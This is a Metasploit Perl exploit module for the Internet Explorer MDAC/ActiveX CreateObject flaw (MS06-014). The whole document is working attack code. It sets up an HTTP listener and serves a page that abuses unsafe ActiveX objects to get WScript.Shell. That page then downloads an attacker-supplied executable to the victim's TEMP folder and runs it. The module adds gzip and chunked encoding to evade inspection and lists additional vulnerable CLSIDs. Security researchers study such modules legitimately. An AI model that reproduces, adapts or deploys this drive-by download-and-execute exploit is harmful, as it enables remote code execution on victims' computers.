Internet Explorer (MDAC) Remote Code Execution Exploit (MS06-014) (2)
=====================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_createobject;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	&#039;Gzip&#039;       => [1, &#039;Enable gzip content encoding&#039;],
	&#039;Chunked&#039;    => [1, &#039;Enable chunked transfer encoding&#039;],
  };

my $info =
  {
	&#039;Name&#039;           => &#039;Internet Explorer COM CreateObject Code Execution&#039;,
	&#039;Version&#039;        => &#039;$Revision: 3753 $&#039;,
	&#039;Authors&#039;        =>
	  [
		&#039;H D Moore <hdm [at] metasploit.com>&#039;,
	  ],

	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This module exploits a generic code execution vulnerability in Internet 
		Explorer by abusing vulnerable ActiveX objects. 
}),

	&#039;Arch&#039;           => [ &#039;x86&#039; ],
	&#039;OS&#039;             => [ &#039;win32&#039;, &#039;winxp&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;           => 0,

	&#039;UserOpts&#039;       =>
	  {
		&#039;HTTPPORT&#039; => [ 1, &#039;PORT&#039;, &#039;The local HTTP listener port&#039;, 8080      ],
		&#039;HTTPHOST&#039; => [ 0, &#039;HOST&#039;, &#039;The local HTTP listener host&#039;, "0.0.0.0" ],
	  },

	&#039;Payload&#039;        =>
	  {
		&#039;Space&#039;    => 4000,
		&#039;Keys&#039;     => [&#039;-bind&#039;],
	  },
	&#039;Refs&#039;           =>
	  [
		[&#039;MSB&#039;, &#039;MS06-014&#039;]
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
	  	[ &#039;Automatic&#039; ],

		# Patched
		[ &#039;MS06-014 - RDS.DataControl&#039;, &#039;{BD96C556-65A3-11D0-983A-00C04FC29E36}&#039;],

		# Not marked as safe
		[ &#039;UNKNOWN  - RDS.DataSpace&#039;, &#039;{BD96C556-65A3-11D0-983A-00C04FC29E36}&#039;],

		# Not marked as safe
		[ &#039;UNKNOWN  - Business Object Factory &#039;, &#039;{AB9BCEDD-EC7E-47E1-9322-D4A210617116}&#039;],
		
		# Not marked as safe
		[ &#039;UNKNOWN  - Outlook Data Object&#039;, &#039;{0006F033-0000-0000-C000-000000000046}&#039;],

		# Found exploitable in the wild (no details)
		[ &#039;UNKNOWN  - Outlook.Application&#039;, &#039;{0006F03A-0000-0000-C000-000000000046}&#039;],

		# These are restricted by site (might be exploitable via DNS spoofing + SSL fun)
		[ &#039;UNKNOWN  - SoftwareDistribution.MicrosoftUpdateWebControl.1&#039;, &#039;{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}&#039;],
		[ &#039;UNKNOWN  - SoftwareDistribution.WebControl.1&#039;, &#039;{6414512B-B978-451D-A0D8-FCFDF33E833C}&#039;],

		# Part of the WMI SDK, currently unpatched/unreported
		[ &#039;UNKNOWN  - WMIScriptUtils.WMIObjectBroker2.1&#039;, &#039;{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}&#039;],
		
		# Visual Studio components, not marked as safe
		[ &#039;UNKNOWN  - VsmIDE.DTE&#039;, &#039;{06723E09-F4C2-43c8-8358-09FCD1DB0766}&#039;],
		[ &#039;UNKNOWN  - DExplore.AppObj.8.0&#039;, &#039;{639F725F-1B2D-4831-A9FD-874847682010}&#039;],
		[ &#039;UNKNOWN  - VisualStudio.DTE.8.0&#039;, &#039;{BA018599-1DB3-44f9-83B4-461454C84BF8}&#039;],
		[ &#039;UNKNOWN  - Microsoft.DbgClr.DTE.8.0&#039;, &#039;{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}&#039;],
		[ &#039;UNKNOWN  - VsaIDE.DTE&#039;, &#039;{E8CCCDDF-CA28-496b-B050-6C07C962476B}&#039;],			
	  ],

	&#039;Keys&#039;           => [ &#039;ie&#039; ],

	&#039;DisclosureDate&#039; => &#039;&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;

	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;HTTPHOST&#039;),
		LocalPort => $self->GetVar(&#039;HTTPPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar(&#039;HTTPPORT&#039;));
		return;
	}

	my $httphost = ($self->GetVar(&#039;HTTPHOST&#039;) eq &#039;0.0.0.0&#039;) ?
	  Pex::Utils::SourceIP(&#039;1.2.3.4&#039;) :
	  $self->GetVar(&#039;HTTPHOST&#039;);

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar(&#039;HTTPPORT&#039;) ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self      = shift;
	my $fd        = shift;
	my $shellcode = my $shellcode = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	 
	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read the HTTP headers
	my $headers;
	while ( (my $line = $fd->RecvLine(10))) {
		$headers .= $line;
		last if $line eq "\r\n";
	}

	if ($url =~ /\?payload/) {
		$self->PrintLine("[*] HTTP Client $rhost:$rport asked for payload...");
		my $content = Pex::Utils::CreateWin32PE($shellcode, &#039;ie_createobject&#039;);
		$fd->Send($self->BuildResponse($content, &#039;application/octet-stream&#039;));
		$fd->Close;
		return;
	}
	$self->PrintLine("[*] HTTP Client $rhost:$rport asked for exploit page...");
	$fd->Send($self->BuildResponse($self->GenerateHTML(), &#039;text/html&#039;));
	$fd->Close;
	return;
}

sub GenerateHTML {
	my $self       = shift;
	my $target_idx = $self->GetVar(&#039;TARGET&#039;);
	my $objects    = "";
	
	if ($target_idx == 0) {
		foreach my $target (@{ $self->Targets }) {
			if ($target->[1]) {
				$objects .= "&#039;".$target->[1]."&#039;,";
			}
		}
	} else {
		my $target = $self->Targets->[$target_idx];
		$objects .= "&#039;".$target->[1]."&#039;,";
	}

	my $data  = 
qq#
<html><head><title></title>
<script language="javascript">

function Log(m) {
	var log = document.createElement(&#039;p&#039;);
	log.innerHTML = m;
	document.body.appendChild(log);
	
}

function CreateO(o, n) {
	var r = null;
	
	try { eval(&#039;r = o.CreateObject(n)&#039;) }catch(e){}
	
	if (! r) {
		try { eval(&#039;r = o.CreateObject(n, "")&#039;) }catch(e){}
	}
	
	if (! r) {
		try { eval(&#039;r = o.CreateObject(n, "", "")&#039;) }catch(e){}
	}

	if (! r) {
		try { eval(&#039;r = o.GetObject("", n)&#039;) }catch(e){}
	}
	
	if (! r) {
		try { eval(&#039;r = o.GetObject(n, "")&#039;) }catch(e){}
	}
	
	if (! r) {
		try { eval(&#039;r = o.GetObject(n)&#039;) }catch(e){}
	}
	
	return(r);	
}

function Go(a) {
	Log(&#039;Creating helper objects...&#039;);
	var s = CreateO(a, "WScript.Shell");
	var o = CreateO(a, "ADODB.Stream");
	var e = s.Environment("Process");
	
	Log(&#039;Ceating the XMLHTTP object...&#039;);
	var url = document.location + &#039;?payload&#039;;
	var xml = null;
	var bin = e.Item("TEMP") + "metasploit.exe";
	var dat; 
	
	try { xml=new XMLHttpRequest(); }
	catch(e) {
		try { xml = new ActiveXObject("Microsoft.XMLHTTP"); }
		catch(e) {
			xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
		}
	}
	
	if (! xml) return(0);

	Log(&#039;Downloading the payload...&#039;);	
	xml.open("GET", url, false)
	xml.send(null);
	dat = xml.responseBody;

	Log(&#039;Writing the payload to disk...&#039;);	
	o.Type = 1;
	o.Mode = 3;
	o.Open();
	o.Write(dat);
	o.SaveToFile(bin, 2);

	Log(&#039;Executing the payload...&#039;);		
	s.Run(bin,0);
}

function Exploit() {
	var i = 0;
	var t = new Array(${objects}null);
	
	while (t[i]) {
		var a = null;
		
		if (t[i].substring(0,1) == &#039;{&#039;) {
			a = document.createElement("object");
			a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
		} else {
			try { a = new ActiveXObject(t[i]); } catch(e){}
		}
		
		if (a) {
			try {		
				var b = CreateO(a, "WScript.Shell");
				if (b) {
					Log(&#039;Loaded &#039; + t[i]);
					Go(a);
					return(0);
				}
			} catch(e){}
		}
		i++;
	}
	Log(&#039;Exploit failed.&#039;);
}
</script>
</head>
<body onload=&#039;Exploit()&#039;>
<p>Initializing...</p>
</body>
</html>
#;
}

sub BuildResponse {
	my ($self, $content, $type) = @_;
	$type ||= &#039;text/plain&#039;;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: $type\r\n";

	if ($self->GetVar(&#039;Gzip&#039;)) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar(&#039;Chunked&#039;)) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= &#039;Content-Length: &#039; . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), &#039;&#039;);
		$chunked .= sprintf(&#039;%x&#039;, length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, &#039;gzip&#039;, &#039;-&#039;.$comp, &#039;-c&#039;, &#039;--force&#039;);
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}

1;


